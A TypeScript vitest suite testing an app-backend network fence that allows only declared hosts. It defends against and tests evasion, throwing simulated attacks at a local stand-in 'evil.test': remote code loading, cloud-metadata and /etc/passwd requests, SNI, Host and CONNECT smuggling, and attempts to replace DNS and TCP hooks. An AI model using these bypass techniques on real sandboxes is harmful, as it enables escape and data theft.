/**
 * The network fence of app backends (src/apps/guard.ts in the backend,
 * src/apps/egress.ts in the bridge): a backend reaches the hosts its manifest
 * declares and Engram's own API, and nothing else.
 *
 * Everything runs on this machine. The names are resolved by a stub
 * (EgressTesting.resolve) to made-up PUBLIC addresses, so the relay's real
 * address checks run on them, and only then EgressTesting.route sends an
 * allowed connection to a local listener standing in for that address. Every
 * listener answers "REACHED:<its id>", including the ones standing in for
 * hosts that must NOT be reached, so a hole in the fence shows up as a marker
 * that should not be there rather than as a quiet pass. One test at the end
 * declares the "evil" host and reaches it, to prove the suite would notice.
 */

import { createHash } from 'node:crypto';
import { createServer as createHttpServer, type Server as HttpServer, type IncomingMessage, type ServerResponse } from 'node:http';
import { createServer as createHttpsServer } from 'node:https';
import { connect as connectTcp, type Server as NetServer } from 'node:net';
import { createSocket, type Socket as UdpSocket } from 'node:dgram';
import { mkdtempSync, readFileSync, rmSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { afterAll, beforeAll, describe, expect, it } from 'vitest';
import { AppSupervisor } from '../../src/apps/supervisor.js';
import { hostOfHeader, isPublicAddress, sniOf, startEgress, type EgressTesting } from '../../src/apps/egress.js';
import { SecretStore } from '../../src/local/engram.js';
import type { AppCallMessage } from '../../src/protocol/types.js';

const FIX = join(__dirname, 'fixtures');
const CERT = readFileSync(join(FIX, 'tls', 'cert.pem'), 'utf8');
const KEY = readFileSync(join(FIX, 'tls', 'key.pem'), 'utf8');
const ATTACKER = readFileSync(join(FIX, 'attacker.cjs'), 'utf8');
const ESM_IMPORTS = readFileSync(join(FIX, 'esm-imports.mjs'), 'utf8');
const sha = (s: string) => createHash('sha256').update(s).digest('hex');

/** Made-up public addresses the stub resolver hands out. */
const ADDR = {
  declared: '93.184.216.34',
  evil: '93.184.216.99',
  image: '93.184.216.50',
  internal: '10.0.0.5',
  privateImage: '192.168.1.20',
};
const DNS: Record<string, string[]> = {
  'api.declared.test': [ADDR.declared],
  'internal.declared.test': [ADDR.internal],
  'evil.test': [ADDR.evil],
  'img.public.test': [ADDR.image],
  'private.img.test': [ADDR.privateImage],
};

const closers: (() => Promise<void>)[] = [];
const route = new Map<string, number>(); // "address:port" -> local port
const dirs: string[] = [];
const files = new Map<string, string>();
let origin = '';
let engramPort = 0;
let evilTcpPort = 0;
let udp: UdpSocket;
let udpPort = 0;
let udpReceived = 0;
let unixPath = '';

/** A listener answering REACHED:<id>, with a few paths that redirect. */
function handler(id: string, scheme: 'http' | 'https') {
  return (req: IncomingMessage, res: ServerResponse) => {
    const to: Record<string, string> = {
      '/redirect-evil': `${scheme}://evil.test/`,
      '/redirect-ip': `${scheme}://${ADDR.evil}/`,
      '/redirect-internal': `${scheme}://internal.declared.test/`,
      '/redirect-ok': '/',
    };
    if (to[req.url ?? '']) { res.writeHead(302, { location: to[req.url!] }); res.end(); return; }
    if (req.url === '/payload.js') { res.end(`'REACHED:${id}-code-ran'`); return; }
    res.end(`REACHED:${id} host=${req.headers.host}`);
  };
}

async function listen(server: HttpServer | NetServer): Promise<number> {
  await new Promise<void>((r) => server.listen(0, '127.0.0.1', () => r()));
  closers.push(() => new Promise<void>((r) => { (server as NetServer).close(() => r()); (server as HttpServer).closeAllConnections?.(); }));
  return (server.address() as { port: number }).port;
}

const PNG = Buffer.concat([Buffer.from([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a]), Buffer.alloc(100, 7)]);

beforeAll(async () => {
  route.set(`${ADDR.declared}:443`, await listen(createHttpsServer({ cert: CERT, key: KEY }, handler('declared', 'https'))));
  route.set(`${ADDR.declared}:80`, await listen(createHttpServer(handler('declared-http', 'http'))));
  evilTcpPort = await listen(createHttpsServer({ cert: CERT, key: KEY }, handler('evil', 'https')));
  route.set(`${ADDR.evil}:443`, evilTcpPort);
  route.set(`${ADDR.evil}:80`, await listen(createHttpServer(handler('evil-http', 'http'))));
  const internal = await listen(createHttpServer(handler('internal', 'http')));
  route.set(`${ADDR.internal}:80`, internal);
  route.set(`${ADDR.internal}:443`, await listen(createHttpsServer({ cert: CERT, key: KEY }, handler('internal', 'https'))));
  route.set(`${ADDR.privateImage}:80`, internal);
  const images = (req: IncomingMessage, res: ServerResponse) => {
    if (req.url === '/a.png') { res.writeHead(200, { 'content-type': 'image/png' }); res.end(PNG); return; }
    if (req.url === '/big.png') { res.writeHead(200, { 'content-type': 'image/png' }); res.end(Buffer.alloc(4 * 1024 * 1024)); return; }
    if (req.url === '/page') { res.writeHead(200, { 'content-type': 'text/html' }); res.end('<p>REACHED:image-page</p>'); return; }
    if (req.url === '/to-png') { res.writeHead(302, { location: '/a.png' }); res.end(); return; }
    if (req.url === '/to-private') { res.writeHead(302, { location: 'http://private.img.test/a.png' }); res.end(); return; }
    if (req.url === '/to-port') { res.writeHead(302, { location: 'http://img.public.test:8080/a.png' }); res.end(); return; }
    res.writeHead(404); res.end();
  };
  route.set(`${ADDR.image}:80`, await listen(createHttpServer(images)));
  route.set(`${ADDR.image}:443`, await listen(createHttpsServer({ cert: CERT, key: KEY }, images)));

  // Engram: the app's files and its API.
  const engram = createHttpServer((req, res) => {
    if (req.url?.startsWith('/app-api/')) { res.end('REACHED:engram'); return; }
    const body = files.get((req.url ?? '').split('/').pop()!);
    if (body === undefined) { res.statusCode = 404; res.end(); return; }
    res.end(body);
  });
  engramPort = await listen(engram);
  origin = `http://127.0.0.1:${engramPort}`;
  route.set(`127.0.0.1:${engramPort}`, engramPort);

  udp = createSocket('udp4');
  udp.on('message', () => { udpReceived++; });
  await new Promise<void>((r) => udp.bind(0, '127.0.0.1', () => r()));
  udpPort = udp.address().port;
  closers.push(() => new Promise<void>((r) => udp.close(() => r())));

  const dir = mkdtempSync(join(tmpdir(), 'fence-unix-'));
  dirs.push(dir);
  unixPath = join(dir, 's.sock');
  const unix = createHttpServer(handler('unix', 'http'));
  await new Promise<void>((r) => unix.listen(unixPath, () => r()));
  closers.push(() => new Promise<void>((r) => unix.close(() => r())));
});

afterAll(async () => {
  for (const s of supervisors) await s.stopAll();
  for (const c of closers) await c();
  for (const d of dirs) rmSync(d, { recursive: true, force: true });
});

const testing: EgressTesting = {
  resolve: async (host) => DNS[host] ?? [],
  route: (address, port) => {
    const local = route.get(`${address}:${port}`);
    return local ? { host: '127.0.0.1', port: local } : undefined;
  },
  ca: CERT,
};

const supervisors: AppSupervisor[] = [];
function supervisor(): AppSupervisor {
  const dir = mkdtempSync(join(tmpdir(), 'fence-apps-'));
  dirs.push(dir);
  const s = new AppSupervisor({
    config: { enabled: true }, apiOrigin: origin, secrets: async () => new SecretStore(), dataDir: dir,
    requestMs: 15_000, egressTesting: testing,
  });
  supervisors.push(s);
  return s;
}

function app(network: string[] | false, extra: Partial<AppCallMessage['backend']> = {}, main: [string, string] = ['server.cjs', ATTACKER]) {
  const tree: Record<string, string> = {};
  for (const [path, content] of [main, ['ca.pem', CERT]] as const) {
    files.set(sha(content), content);
    tree[path] = sha(content);
  }
  const hash = sha(`${main[0]}-${JSON.stringify(network)}-${JSON.stringify(extra)}`);
  return (body: Record<string, unknown>): AppCallMessage => ({
    type: 'app_call', id: `c${Math.random()}`,
    app: { space_id: 'space-1', name: 'attacker', version: 1, hash },
    files: { base: `${origin}/app-blobs/tok/`, tree },
    backend: { main: main[0], folders: [], shell: false, programs: [], network, ...extra },
    fill: [],
    request: { method: 'POST', path: '/try', headers: {}, body: JSON.stringify(body) },
    engram: { api: `${origin}/app-api`, token: 'tok-1' },
  });
}

let fenced: AppSupervisor;
const declared = app(['api.declared.test', 'internal.declared.test']);
async function attempt(body: Record<string, unknown>, s = fenced, which = declared): Promise<unknown> {
  const r = await s.handle(which(body));
  expect(r.error).toBeUndefined();
  return (JSON.parse(r.response!.body) as { result: unknown }).result;
}

/** Results are kept for the summary printed at the end. */
const report: [string, unknown][] = [];
async function check(name: string, body: Record<string, unknown>, expectation: (r: unknown) => void, s?: AppSupervisor, which?: ReturnType<typeof app>) {
  const r = await attempt(body, s, which);
  report.push([name, r]);
  expectation(r);
}
const reachedOnly = (id: string) => (r: unknown) => expect(r).toMatch(new RegExp(`^reached:${id}$`));
const stoppedNot = (r: unknown) => {
  expect(String(r)).toMatch(/^stopped/);
  expect(String(r)).not.toMatch(/reached:(evil|internal|unix)/);
};

describe('the network fence of an app backend', () => {
  beforeAll(() => { fenced = supervisor(); });
  afterAll(() => {
    // A plain list in the test output, one line per case.
    process.stdout.write(`\nnetwork fence results:\n${report.map(([n, r]) => `  ${n}: ${JSON.stringify(r)}`).join('\n')}\n`);
  });

  describe('reaches what it declares', () => {
    it('a declared host through fetch (https)', () => check('fetch https declared', { op: 'fetch', url: 'https://api.declared.test/' }, reachedOnly('declared')));
    it('a declared host through https.get', () => check('https.get declared', { op: 'https', url: 'https://api.declared.test/' }, reachedOnly('declared')));
    it('a declared host through http.get', () => check('http.get declared', { op: 'http', url: 'http://api.declared.test/' }, reachedOnly('declared-http')));
    it('a declared host through fetch over plain http', () => check('fetch http declared', { op: 'fetch', url: 'http://api.declared.test/' }, reachedOnly('declared-http')));
    it('a declared host on a kept-alive connection, request after request', () => check('keep-alive declared x3',
      { op: 'keepalive', url: 'http://api.declared.test/', hosts: ['api.declared.test', 'api.declared.test', 'api.declared.test'] },
      (r) => expect(r).toEqual(['reached:declared-http', 'reached:declared-http', 'reached:declared-http'])));
    it('a redirect that stays on the declared host', () => check('redirect within declared', { op: 'fetch', url: 'https://api.declared.test/redirect-ok' }, reachedOnly('declared')));
    it("Engram's own API", () => check('Engram API', { op: 'engram' }, reachedOnly('engram')));
    it('a declared name resolves inside the backend, to a stand-in', () => check('dns.lookup declared', { op: 'dns_lookup', name: 'api.declared.test' }, (r) => expect(r).toBe('resolved:127.0.0.1')));
  });

  describe('refuses an undeclared host', () => {
    it('through fetch', () => check('fetch undeclared', { op: 'fetch', url: 'https://evil.test/' }, stoppedNot));
    it('through http.get', () => check('http.get undeclared', { op: 'http', url: 'http://evil.test/' }, stoppedNot));
    it('through https.get', () => check('https.get undeclared', { op: 'https', url: 'https://evil.test/' }, stoppedNot));
    it('through net.connect', () => check('net.connect undeclared', { op: 'net', host: 'evil.test', port: 80, data: 'GET / HTTP/1.1\r\nHost: evil.test\r\n\r\n' }, stoppedNot));
    it('through tls.connect', () => check('tls.connect undeclared', { op: 'tls', host: 'evil.test', port: 443, servername: 'evil.test', data: 'GET / HTTP/1.1\r\nHost: evil.test\r\n\r\n' }, stoppedNot));
    it('through dgram (UDP), to a name and to an address', async () => {
      const before = udpReceived;
      await check('dgram to a name', { op: 'dgram', host: 'evil.test', port: udpPort }, stoppedNot);
      await check('dgram to 127.0.0.1', { op: 'dgram', host: '127.0.0.1', port: udpPort }, stoppedNot);
      await new Promise((r) => setTimeout(r, 100));
      expect(udpReceived).toBe(before);
    });
    it('through dns.lookup and dns.resolve (no query leaves)', async () => {
      await check('dns.lookup undeclared', { op: 'dns_lookup', name: 'evil.test' }, (r) => expect(r).toMatch(/^stopped: ENOTFOUND/));
      await check('dns.resolve4 any name', { op: 'dns_resolve', name: 'api.declared.test' }, (r) => expect(r).toMatch(/^stopped/));
    });
    it('by connecting straight to a listener on this machine', () => check('net.connect 127.0.0.1:<a real local listener>',
      { op: 'net', host: '127.0.0.1', port: evilTcpPort, data: 'x' }, (r) => expect(r).toMatch(/^stopped: EACCES/)));
    it('through a Unix socket', () => check('unix socket', { op: 'unix', path: unixPath }, stoppedNot));
    it('by listening', () => check('listen', { op: 'listen' }, stoppedNot));
  });

  describe('refuses addresses typed in', () => {
    it('an IPv4 literal, http and https', async () => {
      await check('fetch http://<ipv4>', { op: 'fetch', url: `http://${ADDR.evil}/` }, stoppedNot);
      await check('fetch https://<ipv4>', { op: 'fetch', url: `https://${ADDR.evil}/` }, stoppedNot);
    });
    it('an IPv6 literal, http and https', async () => {
      await check('fetch http://[ipv6]', { op: 'fetch', url: 'http://[2606:2800:220:1:248:1893:25c8:1946]/' }, stoppedNot);
      await check('fetch https://[ipv6]', { op: 'fetch', url: 'https://[2606:2800:220:1:248:1893:25c8:1946]/' }, stoppedNot);
    });
    it('localhost and loopback', async () => {
      await check('fetch http://localhost', { op: 'fetch', url: 'http://localhost/' }, stoppedNot);
      await check('fetch http://127.0.0.1', { op: 'fetch', url: 'http://127.0.0.1/' }, stoppedNot);
      await check('fetch http://[::1]', { op: 'fetch', url: 'http://[::1]/' }, stoppedNot);
      await check(`fetch http://127.0.0.1:<engram port> with another Host`, { op: 'http', url: `http://127.0.0.1:${engramPort}/app-api/x`, headers: { host: 'evil.test' } }, stoppedNot);
    });
    it('private ranges and the cloud metadata address', async () => {
      await check('fetch http://10.0.0.5', { op: 'fetch', url: `http://${ADDR.internal}/` }, stoppedNot);
      await check('fetch http://192.168.1.1', { op: 'fetch', url: 'http://192.168.1.1/' }, stoppedNot);
      await check('fetch http://169.254.169.254', { op: 'fetch', url: 'http://169.254.169.254/latest/meta-data/' }, stoppedNot);
    });
    it('a declared host whose DNS points at a private address', async () => {
      await check('declared name -> 10.0.0.5 (https)', { op: 'fetch', url: 'https://internal.declared.test/' }, stoppedNot);
      await check('declared name -> 10.0.0.5 (http)', { op: 'fetch', url: 'http://internal.declared.test/' }, stoppedNot);
    });
  });

  describe('refuses the ways around a name check', () => {
    it('a redirect to an undeclared host, an address, or a private one', async () => {
      await check('redirect to undeclared host', { op: 'fetch', url: 'https://api.declared.test/redirect-evil' }, stoppedNot);
      await check('redirect to an IP address', { op: 'fetch', url: 'https://api.declared.test/redirect-ip' }, stoppedNot);
      await check('redirect to a declared name on a private address', { op: 'fetch', url: 'https://api.declared.test/redirect-internal' }, stoppedNot);
      await check('plain-http redirect to undeclared host', { op: 'fetch', url: 'http://api.declared.test/redirect-evil' }, stoppedNot);
    });
    it('a TLS server name for an undeclared host, whatever the Host or address', async () => {
      await check('SNI evil.test to a declared name', { op: 'tls', host: 'api.declared.test', port: 443, servername: 'evil.test', data: 'GET / HTTP/1.1\r\nHost: api.declared.test\r\n\r\n' }, stoppedNot);
      await check('SNI evil.test to an IP address', { op: 'tls', host: ADDR.evil, port: 443, servername: 'evil.test', data: 'GET / HTTP/1.1\r\nHost: evil.test\r\n\r\n' }, stoppedNot);
    });
    it('a declared TLS name with another Host inside reaches only the declared host', async () => {
      // Node's https takes the server name from the Host header unless told otherwise: refused at the name.
      await check('https.get with Host evil.test (SNI follows Host)', { op: 'https', url: 'https://api.declared.test/', headers: { host: 'evil.test' } }, stoppedNot);
      await check('SNI declared, Host evil.test (https.get)', { op: 'https', url: 'https://api.declared.test/', servername: 'api.declared.test', headers: { host: 'evil.test' } }, reachedOnly('declared'));
      await check('SNI declared, connected to the evil address', { op: 'tls', host: ADDR.evil, port: 443, servername: 'api.declared.test', data: 'GET / HTTP/1.1\r\nHost: evil.test\r\nConnection: close\r\n\r\n' }, reachedOnly('declared'));
    });
    it('a plain-HTTP Host that is not declared, sent to a declared name', () => check('Host evil.test on api.declared.test:80',
      { op: 'http', url: 'http://api.declared.test/', headers: { host: 'evil.test' } }, stoppedNot));
    it('a kept-alive connection switching Host', async () => {
      await check('keep-alive http: declared then evil.test', { op: 'keepalive', url: 'http://api.declared.test/', hosts: ['api.declared.test', 'evil.test'] },
        (r) => { expect((r as string[])[0]).toBe('reached:declared-http'); expect((r as string[])[1]).toMatch(/^stopped: HTTP 403/); });
      await check('pipelined on one raw socket: declared then evil.test', {
        op: 'net', host: 'api.declared.test', port: 80,
        data: 'GET / HTTP/1.1\r\nHost: api.declared.test\r\n\r\nGET / HTTP/1.1\r\nHost: evil.test\r\n\r\n',
      }, (r) => expect(r).toBe('reached:declared-http + stopped: HTTP 403'));
      // Node's agent opens a new TLS connection for another Host (its server name differs): refused.
      await check('keep-alive https agent: declared then Host evil.test', { op: 'keepalive', url: 'https://api.declared.test/', hosts: ['api.declared.test', 'evil.test'] },
        (r) => { expect((r as string[])[0]).toBe('reached:declared'); stoppedNot((r as string[])[1]); });
      // Two requests on ONE TLS connection: inside TLS the relay sees nothing, so both go to the declared host.
      await check('one TLS connection: declared then Host evil.test', {
        op: 'tls', host: 'api.declared.test', port: 443, servername: 'api.declared.test',
        data: 'GET / HTTP/1.1\r\nHost: api.declared.test\r\n\r\nGET / HTTP/1.1\r\nHost: evil.test\r\nConnection: close\r\n\r\n',
      }, (r) => expect(r).toBe('reached:declared + reached:declared'));
    });
    it('HTTP CONNECT, and a request for an absolute URL', async () => {
      await check('CONNECT via http.request', { op: 'connect_method', host: 'api.declared.test', port: 80, target: 'evil.test:443' }, stoppedNot);
      await check('CONNECT on a raw socket', { op: 'net', host: 'api.declared.test', port: 80, data: 'CONNECT evil.test:443 HTTP/1.1\r\nHost: api.declared.test\r\n\r\n' }, stoppedNot);
      await check('absolute-form request target', { op: 'net', host: 'api.declared.test', port: 80, data: 'GET http://evil.test/ HTTP/1.1\r\nHost: api.declared.test\r\n\r\n' }, stoppedNot);
    });
    it('raw TCP that is neither TLS nor HTTP', () => check('raw bytes to port 443', { op: 'net', host: 'api.declared.test', port: 443, data: 'hello\r\n\r\n' }, stoppedNot));
    it('a declared host on another port', () => check('declared host on port 8443', { op: 'fetch', url: 'https://api.declared.test:8443/' }, stoppedNot));
    it('loading code from an undeclared host: the fetch fails, nothing is evaluated', () => check('fetch code then eval',
      { op: 'loadcode', url: 'https://evil.test/payload.js' }, (r) => { expect(r).toMatch(/evaluated: no$/); expect(r).not.toMatch(/code-ran/); }));
    it('loading code by IP address: refused too', () => check('fetch code by IP then eval',
      { op: 'loadcode', url: `http://${ADDR.evil}/payload.js` }, (r) => { expect(r).toMatch(/refused by the bridge.*evaluated: no$/); }));
  });

  describe('cannot be taken apart from inside', () => {
    it('native bindings are closed', () => check('process.binding', { op: 'binding' }, (r) => expect(r).toMatch(/^stopped: ERR_ACCESS_DENIED/)));
    it('V8 flags cannot be changed', () => check('v8.setFlagsFromString', { op: 'v8flags' }, (r) => expect(r).toMatch(/^stopped/)));
    it('the lookup and the TCP connect cannot be replaced', () => check('replace dns.lookup / TCP connect',
      { op: 'undo_fence', url: 'https://evil.test/' },
      (r) => {
        const out = r as string[];
        expect(out.slice(0, 3).every((x) => x.startsWith('stopped: TypeError'))).toBe(true);
        expect(out[3]).toMatch(/^stopped/);
      }));
    it('no proxy variable or bridge setting reaches the backend', async () => {
      process.env.HTTPS_PROXY = 'http://evil.test:3128';
      try {
        const s = supervisor();
        await check('environment keys', { op: 'env' }, (r) => {
          expect(String(r)).not.toMatch(/PROXY|ENGRAM_NETWORK|NODE_OPTIONS/i);
        }, s);
      } finally { delete process.env.HTTPS_PROXY; }
    });
  });

  // The fence replaces functions on built-in modules; an app written as ES
  // modules imports them by name, and a name the fence hid from the module's
  // exports would stop it from starting at all (0.29.0 did, to Engram's Mail).
  describe('an app written as ES modules', () => {
    const esm = app(['api.declared.test'], { public_images: true }, ['server.mjs', ESM_IMPORTS]);
    it('starts with named imports from dns, dns/promises, net, tls, http, https, dgram and v8', () =>
      check('esm named imports link', { op: 'linked' }, (r) => expect(r).toBe('linked'), fenced, esm));
    it('gets the fenced functions through them, the same as require does', () =>
      check('esm imports are the fenced ones', { op: 'same' }, (r) => expect(r).toBe('same'), fenced, esm));
    it('an imported lookup answers a declared host with the stand-in', () =>
      check('esm lookup declared', { op: 'lookup', name: 'api.declared.test' }, (r) => expect(r).toBe('resolved:127.0.0.1'), fenced, esm));
    it('an imported lookup refuses an undeclared host', () =>
      check('esm lookup undeclared', { op: 'lookup', name: 'evil.test' }, (r) => expect(r).toBe('stopped: ENOTFOUND'), fenced, esm));
    it('an imported setFlagsFromString is the refusing one', () =>
      check('esm v8 flags', { op: 'v8flags' }, (r) => expect(r).toMatch(/^stopped: Engram/), fenced, esm));
  });

  describe('public images (manifest "public_images": true)', () => {
    const images = app(['api.declared.test'], { public_images: true });
    const img = (name: string, body: Record<string, unknown>, e: (r: unknown) => void) => check(name, { op: 'image', ...body }, e, fenced, images);
    it('loads an image from any public host, over http and https, following a redirect', async () => {
      await img('image over http', { url: 'http://img.public.test/a.png' }, (r) => expect(r).toBe(`image:image/png:${PNG.length}`));
      await img('image over https', { url: 'https://img.public.test/a.png' }, (r) => expect(r).toBe(`image:image/png:${PNG.length}`));
      await img('image after a redirect', { url: 'http://img.public.test/to-png' }, (r) => expect(r).toBe(`image:image/png:${PNG.length}`));
    });
    it('refuses what is not an image, too large, private, another port, or not GET', async () => {
      await img('image: an HTML page', { url: 'http://img.public.test/page' }, (r) => expect(r).toMatch(/^stopped: HTTP 403 .*not an image/));
      await img('image: over 3 MB', { url: 'http://img.public.test/big.png' }, (r) => expect(r).toMatch(/^stopped: HTTP 403 .*3 MB/));
      await img('image: a private address', { url: 'http://private.img.test/a.png' }, (r) => expect(r).toMatch(/^stopped: HTTP 403 .*private/));
      await img('image: an IP literal in a private range', { url: 'http://169.254.169.254/a.png' }, (r) => expect(r).toMatch(/^stopped: HTTP 403/));
      await img('image: a redirect to a private address', { url: 'http://img.public.test/to-private' }, (r) => expect(r).toMatch(/^stopped: HTTP 403 .*private/));
      await img('image: a redirect to another port', { url: 'http://img.public.test/to-port' }, (r) => expect(r).toMatch(/^stopped: HTTP 403 .*ports/));
      await img('image: POST', { url: 'http://img.public.test/a.png', method: 'POST' }, (r) => expect(r).toMatch(/^stopped: HTTP 405/));
      await img('image: file://', { url: 'file:///etc/passwd' }, (r) => expect(r).toMatch(/^stopped: HTTP 403/));
    });
    it('does not open other hosts to the backend itself', () => check('public_images app: fetch evil.test directly', { op: 'fetch', url: 'https://evil.test/' }, stoppedNot, fenced, images));
    it('is not there for an app that did not declare it', () => check('image fetcher without the declaration', { op: 'fetch', url: 'http://engram-images.invalid/?url=http%3A%2F%2Fimg.public.test%2Fa.png' }, stoppedNot));
  });

  it('control: the same attempts reach the "evil" host once it is declared, so the suite would see a hole', async () => {
    const open = app(['evil.test']);
    await check('control: fetch evil.test when declared', { op: 'fetch', url: 'https://evil.test/' }, reachedOnly('evil'), fenced, open);
    await check('control: http evil.test when declared', { op: 'http', url: 'http://evil.test/' }, reachedOnly('evil-http'), fenced, open);
  });
});

describe('the relay on its own', () => {
  /** A TLS ClientHello whose server_name extensions carry these names (one inner list per extension). */
  const hello = (extensions: string[][]): Buffer => {
    const exts = Buffer.concat(extensions.map((names) => {
      const list = Buffer.concat(names.map((n) => Buffer.concat([Buffer.from([0, n.length >> 8, n.length & 0xff]), Buffer.from(n)])));
      const body = Buffer.concat([Buffer.from([list.length >> 8, list.length & 0xff]), list]);
      return Buffer.concat([Buffer.from([0, 0, body.length >> 8, body.length & 0xff]), body]);
    }));
    const hs = Buffer.concat([Buffer.from([3, 3]), Buffer.alloc(32), Buffer.from([0, 0, 2, 0, 0x2f, 1, 0]), Buffer.from([exts.length >> 8, exts.length & 0xff]), exts]);
    const msg = Buffer.concat([Buffer.from([1, 0, hs.length >> 8, hs.length & 0xff]), hs]);
    return Buffer.concat([Buffer.from([0x16, 3, 1, msg.length >> 8, msg.length & 0xff]), msg]);
  };
  it('reads the server name of a TLS hello, and refuses none, two names, or two extensions', () => {
    expect(sniOf(hello([['a.test']]))).toBe('a.test');
    expect(sniOf(hello([]))).toBeNull();
    expect(sniOf(hello([['a.test', 'b.test']]))).toBeNull();
    expect(sniOf(hello([['a.test'], ['b.test']]))).toBeNull();
    expect(sniOf(hello([['a.test']]).subarray(0, 20))).toBeUndefined();
    expect(sniOf(Buffer.from([0x17, 3, 3, 0, 1, 0]))).toBeNull();
  });
  it('takes a Host header apart', () => {
    expect(hostOfHeader('api.declared.test:80')).toBe('api.declared.test');
    expect(hostOfHeader('[::1]:80')).toBe('::1');
    expect(hostOfHeader('a b')).toBeNull();
    expect(hostOfHeader('user@evil.test')).toBeNull();
  });
  it('tells public addresses from local ones, IPv4 inside IPv6 included', () => {
    for (const ip of ['10.1.2.3', '127.0.0.1', '169.254.169.254', '192.168.0.1', '172.16.5.5', '100.64.0.1', '::1', 'fe80::1', 'fd00::1', '::ffff:10.0.0.1', '64:ff9b::a00:1', '2002:a00:1::1', '0.0.0.0']) {
      expect(isPublicAddress(ip), ip).toBe(false);
    }
    for (const ip of ['93.184.216.34', '1.1.1.1', '2606:4700::1111', '::ffff:1.1.1.1']) expect(isPublicAddress(ip), ip).toBe(true);
  });
  it('drops a connection that says nothing, without hanging the bridge', async () => {
    const why: string[] = [];
    const e = await startEgress({ hosts: [], engram: { host: 'engram.test', port: 443 }, testing: { ...testing, headMs: 100 } }, (w) => why.push(w));
    expect(Object.keys(e.ports).sort()).toEqual(['443', '80']);
    const closed = await new Promise<boolean>((resolve) => {
      const s = connectTcp(e.ports['443']!, '127.0.0.1');
      s.on('close', () => resolve(true));
      s.on('error', () => {});
      setTimeout(() => resolve(false), 2000);
    });
    expect(closed).toBe(true);
    expect(why.join(' ')).toMatch(/said nothing/);
    await e.close();
  });
});
